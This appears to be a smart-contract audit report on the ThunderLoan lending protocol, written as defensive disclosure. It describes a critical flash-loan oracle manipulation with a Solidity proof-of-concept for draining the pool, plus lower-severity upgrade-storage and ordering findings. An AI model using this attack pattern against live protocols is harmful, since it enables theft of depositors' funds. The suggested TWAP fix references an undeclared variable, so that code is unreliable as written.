## Finding 1: Flash Loan Oracle Manipulation via TSwap Spot Price

**Severity**: 🔴 CRITICAL | **Pattern**: #1 — Flash Loan + Price Oracle

#### Description
`OracleUpgradeable.getPriceInWeth()` uses `TSwapPool.getPriceOfOnePoolTokenInWeth()` — an instantaneous AMM spot price that can be manipulated within a single transaction via flash loan. The manipulated price propagates through `getCalculatedFee()` → `updateExchangeRate()`, distorting the exchange rate and enabling excess token minting.

#### Vulnerable Code
```solidity
// OracleUpgradeable.sol:15
function getPriceInWeth(address token) public view returns (uint256) {
    address pool = s_poolMapping[token];
    return ITSwapPool(pool).getPriceOfOnePoolTokenInWeth(); // ⚠️ SPOT PRICE
}

// ThunderLoan.sol:210
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256) {
    uint256 value = (amount * getPriceInWeth(address(token))) / s_feePrecision;
    return (value * s_flashLoanFee) / s_feePrecision; // Depends on manipulable price
}
```

#### Impact
1. Flash loan 1M tokens → swap → manipulate TSwap pool reserves
2. `deposit()` → `getCalculatedFee()` returns inflated fee → `updateExchangeRate(fee)` → rate distorted
3. `redeem()` → using distorted rate → extract more underlying tokens than deposited
4. Repay flash loan → profit

**Affected Funds**: All tokens in the AssetToken pool  
**Likelihood**: HIGH (no prerequisites, single tx)  
**Pattern Reference**: bZx $50M (2020), Cream $130M (2021)

#### Proof of Concept
```solidity
function testOracleManipulation() public {
    // 1. Flash loan DAI from Aave
    uint256 loanAmount = 1_000_000e18;
    aavePool.flashLoan(address(this), DAI, loanAmount, "");
}

function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata) external {
    // 2. Manipulate TSwap pool
    DAI.approve(address(tswapPool), amount);
    tswapPool.swapExactInput(DAI, amount); // Pushes DAI price down
    
    // 3. Deposit at manipulated price → inflated exchange rate
    thunderLoan.deposit(DAI, 100_000e18);
    
    // 4. Redeem → extract excess value
    uint256 shares = assetToken.balanceOf(address(this));
    thunderLoan.redeem(DAI, shares);
    
    // 5. Repay flash loan
    DAI.transfer(address(aavePool), amount + fee);
    // Profit = redeemed - deposited - fee
}
```

#### Recommended Mitigation
```solidity
// Use TWAP instead of spot price
function getPriceInWeth(address token) public view returns (uint256) {
    return ITSwapPool(pool).getTWAPPrice(token, 30 minutes);
}
```

#### Upgrade Path Issue
`ThunderLoanUpgraded` inherits same vulnerable `OracleUpgradeable.getPriceInWeth()` — both versions affected.

## Finding 2: Storage Collision Risk in UUPS Upgrade

**Severity**: 🟡 MEDIUM | **Pattern**: #13 — Upgrade Storage Collision

#### Description
`ThunderLoanUpgraded` adds new state variables (`s_flashLoanFee`, `s_feePrecision`) without a storage gap, risking collision with future upgrades.

#### Recommended Mitigation
Add `uint256[50] private __gap;` at the end of state variables.

## Finding 3: CEI Pattern Deviation in `deposit()`

**Severity**: 🔵 LOW | **Pattern**: #2 — CEI Violation

#### Description
`deposit()` calls `assetToken.mint()` (state change) AFTER `updateExchangeRate()` (external call to AssetToken), which itself is state-changing. While not directly exploitable (no callback path), the unusual ordering increases audit burden.
